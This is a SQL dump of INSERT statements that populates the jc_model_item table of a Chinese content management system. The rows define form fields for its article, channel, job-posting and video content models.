INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (185,6,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (186,6,'channelId','栏目',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (187,6,'title','标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (188,6,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (189,6,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (190,6,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (191,6,'description','内容简介',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (192,6,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (193,6,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (194,6,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (195,6,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (196,6,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (197,6,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (198,6,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (199,6,'typeImg','类型图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (200,6,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (201,6,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (202,6,'attachments','附件',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (203,6,'media','多媒体',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (246,4,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (249,8,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (250,8,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (251,8,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (252,8,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (253,8,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (254,8,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (255,8,'tplContent','选择模型模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (256,8,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (257,8,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (258,8,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (259,8,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (260,8,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (262,8,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (263,8,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (264,8,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (265,8,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (266,8,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (268,8,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (269,8,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (270,8,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (271,8,'channelId','栏目',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (272,8,'title','岗位名称',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (275,8,'tagStr','Tag标签',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (279,8,'viewGroupIds','浏览权限',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (280,8,'topLevel','固顶级别',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (281,8,'releaseDate','发布时间',2,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (282,8,'typeId','内容类型',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (283,8,'tplContent','指定模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (289,8,'txt','职位描述',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (290,8,'deadline','截止日期',2,NULL,NULL,NULL,'3','30','留空永久有效',NULL,5,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (291,8,'experience','工作经验',3,NULL,'1-3年,3-5年,5年以上,不限',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (292,8,'education','最低学历',3,'','专科,本科,硕士,不限','','3','30','','',6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (293,8,'salary','职位月薪',4,NULL,'1500-2000,2000-3000,3000-5000,5000-8000,8000以上,面议',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (294,8,'workplace','工作地点',4,'','北京,上海,深圳,广州,重庆,南京,杭州,西安,南昌','','3','30','','',7,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (295,8,'nature','工作性质',5,'','全职,兼职','','3','30','','',8,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (296,8,'hasmanage','管理经验',5,'','要求,不要求','','3','30','','',8,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (297,8,'nums','招聘人数',6,'','1-3人,3-5人,5-10人,若干','','3','30','','',6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (298,8,'category','职位类别',6,NULL,'项目主管,java高级工程师,java工程师,网页设计师,测试人员,技术支持',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (335,1,'workflowId','工作流',12,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (338,4,'workflowId','工作流',10,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (339,5,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (340,6,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (342,8,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (344,1,'channelId','栏目',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (403,6,'Director','导演',10,'','','','1','2','','',1,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (404,6,'Starring','主演',10,'','','','1','30','','',1,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (405,6,'VideoType','视频类型',10,NULL,'历史,古装,都市,喜剧,悬疑,动作,谍战,伦理,战争,惊悚',NULL,'3','30',NULL,NULL,7,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (406,6,'Video','影片信息',10,'','正片,预告片','','3','30','','',6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (408,1,'contentImg','内容图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (409,5,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,0,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (410,6,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
